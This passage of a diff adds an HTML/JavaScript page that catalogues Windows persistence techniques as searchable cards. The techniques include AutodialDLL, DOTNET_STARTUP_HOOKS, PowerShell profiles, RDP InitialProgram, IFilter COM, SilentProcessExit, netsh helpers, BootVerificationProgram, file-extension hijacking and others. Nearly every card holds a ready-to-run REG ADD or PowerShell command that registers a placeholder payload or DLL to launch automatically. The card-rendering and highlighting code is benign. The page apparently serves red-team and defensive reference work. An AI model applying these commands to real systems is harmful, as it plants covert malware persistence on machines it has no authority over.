+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters" /v AutodialDLL /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: ".NET Startup Hooks",
+        perm: "Admin",
+        context: "User; System",
+        type: "Other",
+        code: "DLL",
+        launch: "Automatic; User initiated",
+        impact: "Non-destructive",
+        desc: "The DOTNET_STARTUP_HOOKS environment variable causes the .NET runtime to load a DLL before Main() and call StartupHook.Initialize().",
+        location: ["DOTNET_STARTUP_HOOKS environment variable"],
+        example: `setx DOTNET_STARTUP_HOOKS "C:\\Tools\\evil.dll" /M`
+      },
+      {
+        title: "PowerShell Profiles",
+        perm: "Admin; User",
+        context: "User",
+        type: "Files only",
+        code: "Other",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "PowerShell executes profile scripts automatically whenever the shell starts unless -NoProfile is used.",
+        location: [
+          "$PSHOME\\Profile.ps1",
+          "$PSHOME\\Microsoft.PowerShell_profile.ps1",
+          "$Home\\Documents\\PowerShell\\Profile.ps1",
+          "$Home\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1"
+        ],
+        example: `Add-Content "$Home\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1" "Start-Process C:\\Tools\\payload.exe"`
+      },
+      {
+        title: "TS Initial Program",
+        perm: "Admin; User",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "If fInheritInitialProgram is enabled, the executable in InitialProgram starts automatically when an RDP session connects.",
+        location: [
+          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services",
+          "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"
+        ],
+        example: `REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v fInheritInitialProgram /t REG_DWORD /d 1 /f
+REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v InitialProgram /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "RDP WDS Startup Programs",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "Any logon required",
+        impact: "Non-destructive",
+        desc: "Applications listed in this key run server-side after an RDP connection is established. Multiple values are comma-separated without spaces.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\StartupPrograms"],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\StartupPrograms" /v StartupPrograms /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "IFilter",
+        perm: "Admin",
+        context: "System",
+        type: "COM",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "A custom IFilter COM DLL is loaded whenever Windows Search indexes a file of the registered extension.",
+        location: ["HKLM\\SOFTWARE\\Classes"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Classes\\CLSID\\{YOUR-GUID}\\InprocServer32" /ve /t REG_SZ /d "C:\\Tools\\evil.dll" /f
+REG ADD "HKLM\\SOFTWARE\\Classes\\.malware\\PersistentHandler" /ve /t REG_SZ /d "{YOUR-GUID}" /f`
+      },
+      {
+        title: "Recycle Bin COM Extension Handler",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Destructive",
+        desc: "Adding an open\\command subkey under the Recycle Bin CLSID causes the configured executable to run when the Recycle Bin is opened.",
+        location: [
+          "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\",
+          "HKLM\\SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\"
+        ],
+        example: `REG ADD "HKLM\\SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command" /ve /t REG_SZ /d "calc.exe" /f
+REG ADD "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command" /ve /t REG_SZ /d "calc.exe" /f`
+      },
+      {
+        title: "TelemetryController",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "EXE",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "CompatTelRunner.exe runs arbitrary commands configured under TelemetryController. Requires an active network connection.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\RunOnce" /v Command /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Monitoring Silent Process Exit",
+        perm: "Admin",
+        context: "User; System",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "None",
+        desc: "Configures a monitor process to launch when a target process exits silently.",
+        location: [
+          "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\<ProcessName>",
+          "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<ProcessName>"
+        ],
+        example: `New-Item -Force "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" | Out-Null
+Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" GlobalFlag -Value 512
+New-Item -Force "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" | Out-Null
+Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" ReportingMode -Value 1
+Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" MonitorProcess -Value "powershell -c calc.exe #"`
+      },
+      {
+        title: "Desired State Configuration",
+        perm: "Admin",
+        context: "System",
+        type: "Other",
+        code: "Files ; Other ; Fileless",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "DSC Local Configuration Manager applies configurations periodically. A malicious configuration re-runs after reboots and deviations.",
+        location: ["Microsoft DSC Local Configuration Manager"],
+        example: `[DSCLocalConfigurationManager()]
+Configuration SetDSCLMConfig {
+    node localhost {
+        Settings {
+            ActionAfterReboot = 'ContinueConfiguration'
+            AllowModuleOverWrite = $true
+            ConfigurationMode = 'ApplyAndAutoCorrect'
+            ConfigurationModeFrequencyMins = 15
+        }
+    }
+}
+SetDSCLMConfig -OutputPath C:\\foo\\bar | Out-Null
+Set-DscLocalConfigurationManager -Path C:\\foo\\bar -ComputerName localhost`
+      },
+      {
+        title: "Screen Saver",
+        perm: "User",
+        context: "User; System",
+        type: "Registry",
+        code: "EXE",
+        launch: "Automatic; Any logon required; User initiated",
+        impact: "Non-destructive",
+        desc: "A screensaver path in the registry runs after inactivity or when the screensaver settings are opened.",
+        location: ["HKCU\\Control Panel\\Desktop"],
+        example: `REG ADD "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\\Tools\\payload.scr" /f
+REG ADD "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f
+REG ADD "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f`
+      },
+      {
+        title: "Netsh extension DLL",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "DLL",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "netsh.exe loads helper DLLs from the NetSh registry key. DllMain and InitHelperDll are called automatically.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\NetSh"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v EvilHelper /t REG_SZ /d "C:\\Tools\\evil.dll" /f
+netsh`
+      },
+      {
+        title: "Boot Verification Program",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "EXE",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "If an ImagePath value exists under BootVerificationProgram, the Service Manager launches it.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\BootVerificationProgram"],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\BootVerificationProgram" /v ImagePath /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "File Extension Hijacking",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Destructive",
+        desc: "Replacing the default handler for a file extension (e.g. .txt) causes the payload to run when a file of that type is opened.",
+        location: ["HKCU\\txtfile\\shell\\open\\command"],
+        example: `REG ADD "HKCU\\txtfile\\shell\\open\\command" /ve /t REG_SZ /d "C:\\Tools\\payload.exe %1" /f`
+      },
+      {
+        title: "Keyboard Shortcut",
+        perm: "User",
+        context: "User",
+        type: "Other",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Destructive",
+        desc: "A shortcut (.lnk) placed on the Desktop or Start Menu can be bound to a hotkey; pressing the hotkey launches the target.",
+        location: [
+          "$Home\\Desktop",
+          "$env:APPDATA\\Roaming\\Microsoft\\Windows\\Start Menu"
+        ],
+        example: `# Create a shortcut and set a hotkey via its properties (e.g. Ctrl+Alt+E)
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\\Desktop\\Updater.lnk")
+$Shortcut.TargetPath = "C:\\Tools\\payload.exe"
+$Shortcut.Hotkey = "CTRL+ALT+E"
+$Shortcut.Save()`
+      }
+    ];
+
+    const commands = ['REG ADD','REG DELETE','REG QUERY','sc','schtasks','copy','setx','netsh','Start-Process','Add-Content','New-Item','Set-ItemProperty','Out-Null'];
+    const keywords = ['true','false','$true','$false','$null','node','Settings','Configuration','ActionAfterReboot','AllowModuleOverWrite','ConfigurationMode','ConfigurationModeFrequencyMins'];
+
+    function renderCards() {
+      const q = document.getElementById('search').value.toLowerCase();
+      const perm = document.getElementById('filterPerm').value;
+      const launch = document.getElementById('filterLaunch').value;
+      const container = document.getElementById('cards');
+      container.innerHTML = '';
+
+      let visible = 0;
+      techniques.forEach((t, i) => {
+        const matchSearch = !q || t.title.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q) || t.type.toLowerCase().includes(q);
+        const matchPerm = !perm || t.perm.includes(perm);
+        const matchLaunch = !launch || t.launch.toLowerCase().includes(launch.toLowerCase());
+        if (!matchSearch || !matchPerm || !matchLaunch) return;
+
+        visible++;
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.dataset.index = i;
+        const permClass = t.perm.includes('Admin') ? 'admin' : 'user';
+        card.innerHTML = `
+          <h2>${escapeHtml(t.title)}</h2>
+          <div class="tags">
+            <span class="tag ${permClass}">${escapeHtml(t.perm)}</span>
+            <span class="tag">${escapeHtml(t.type)}</span>
+            <span class="tag">${escapeHtml(t.launch)}</span>
+            <span class="tag">${escapeHtml(t.impact)}</span>
+          </div>
+          <p>${escapeHtml(t.desc)}</p>
+          <h3>Location</h3>
+          <ul>${t.location.map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>
+          <h3 class="example-toggle" data-index="${i}" tabindex="0" role="button" aria-expanded="false">Example <span class="chevron">▼</span></h3>
+          <div class="example hidden"><pre><code>${highlight(t.example)}</code></pre></div>
+        `;
+        container.appendChild(card);
+      });
+
+      if (visible === 0) {
+        container.innerHTML = `<div class="empty-state"><p>No techniques match your filters. Try clearing the search or filters.</p></div>`;
+      }
+    }
+
+    function escapeHtml(text) {
+      return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+    }
+
+    function highlight(code) {
+      // Tokenize: split into text, comments, strings, and registry roots.
+      // This prevents regex replacements from corrupting already-wrapped spans.
+      const tokens = [];
+      let rest = code;
+
+      function pushText(text) {
+        if (!text) return;
+        tokens.push({ type: 'text', value: text });
+      }
+      function pushComment(text) {
+        tokens.push({ type: 'comment', value: text });
+      }
+      function pushString(text) {
+        tokens.push({ type: 'string', value: text });
+      }
+      function pushRegistry(root, path) {
+        tokens.push({ type: 'registry', value: root + (path || '') });
+      }
+
+      while (rest.length) {
+        // Comments: line starting with #
+        const commentMatch = rest.match(/^(#[^\n]*)/);
+        if (commentMatch) {
+          pushComment(commentMatch[1]);
+          rest = rest.slice(commentMatch[1].length);
+          continue;
+        }
+        // Double-quoted strings
+        if (rest[0] === '"') {
+          const strMatch = rest.match(/^"(?:[^"\\]|\\.)*"/);
+          if (strMatch) {
+            pushString(strMatch[0]);
+            rest = rest.slice(strMatch[0].length);
+            continue;
+          }
+        }
+        // Registry roots (HKCU, HKLM, HKCR, HKEY_*)
+        const regMatch = rest.match(/^(HKCU|HKLM|HKCR|HKEY_[A-Z_]+)(\\[A-Za-z0-9_\s\.\\-]*)/);
+        if (regMatch) {
+          pushRegistry(regMatch[1], regMatch[2]);
+          rest = rest.slice(regMatch[0].length);
+          continue;
+        }
+        // Single character fallback
+        pushText(rest[0]);
+        rest = rest.slice(1);
+      }
+
+      // Now highlight each token independently.
+      return tokens.map(tok => {
+        if (tok.type === 'comment') return wrapSpan('comment', escapeHtml(tok.value));
+        if (tok.type === 'string') return wrapSpan('string', escapeHtml(tok.value));
+        if (tok.type === 'registry') return wrapSpan('registry', escapeHtml(tok.value));
+
+        let html = escapeHtml(tok.value);
+
+        // File/payload paths like C:\Tools\...
+        html = html.replace(/\b([A-Za-z]:\\[^\s"<>|]*)/g, '<span class="token-path">$1</span>');
+
+        // Common command-line flags / switches
+        html = html.replace(/(\s|^)(\/[a-zA-Z]+)(?=\s|$)/g, '$1<span class="token-flag">$2</span>');
+
+        // Commands (longest first to avoid partial matches)
+        [...commands].sort((a, b) => b.length - a.length).forEach(cmd => {
+          const re = new RegExp('\\b' + cmd.replace(/\s/g, '\\s+').replace(/\$/g, '\\$') + '\\b', 'g');
+          html = html.replace(re, `<span class="token-command">${cmd}</span>`);
+        });
+
+        // Keywords
+        [...keywords].sort((a, b) => b.length - a.length).forEach(kw => {
+          const re = new RegExp('\\b' + kw.replace(/\$/g, '\\$') + '\\b', 'g');
+          html = html.replace(re, `<span class="token-keyword">${kw}</span>`);
+        });
+
+        // Numbers
+        html = html.replace(/\b(\d+)\b/g, '<span class="token-number">$1</span>');
+
+        // GUIDs
+        html = html.replace(/\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}/g,
+          '<span class="token-variable">$&</span>');
+
+        return html;
+      }).join('');
+    }
+
+    function wrapSpan(cls, text) {
+      return `<span class="token-${cls}">${text}</span>`;
+    }
+
+    function setAllExamples(expanded) {
+      document.querySelectorAll('.example').forEach(el => el.classList.toggle('hidden', !expanded));
+      document.querySelectorAll('.example-toggle').forEach(el => {
+        el.setAttribute('aria-expanded', String(expanded));
+      });
+    }
+
+    function clearFilters() {
+      document.getElementById('search').value = '';
+      document.getElementById('filterPerm').value = '';
+      document.getElementById('filterLaunch').value = '';
+      renderCards();
+      document.getElementById('search').focus();
+    }
+
+    document.getElementById('search').addEventListener('input', renderCards);
+    document.getElementById('filterPerm').addEventListener('change', renderCards);
+    document.getElementById('filterLaunch').addEventListener('change', renderCards);
+
+    document.getElementById('expandAll').addEventListener('click', () => setAllExamples(true));
+    document.getElementById('collapseAll').addEventListener('click', () => setAllExamples(false));
+    document.getElementById('clearFilters').addEventListener('click', clearFilters);
+
+    document.getElementById('cards').addEventListener('click', e => {
+      const toggle = e.target.closest('.example-toggle');
+      if (!toggle) return;
+      const example = toggle.nextElementSibling;
+      const hidden = example.classList.toggle('hidden');
+      toggle.setAttribute('aria-expanded', String(!hidden));
+    });
+    document.getElementById('cards').addEventListener('keydown', e => {
+      if (e.key !== 'Enter' && e.key !== ' ') return;
+      const toggle = e.target.closest('.example-toggle');
+      if (!toggle) return;
+      e.preventDefault();
+      toggle.click();
+    });
+
+    renderCards();
+  </script>
+</body>
+</html>
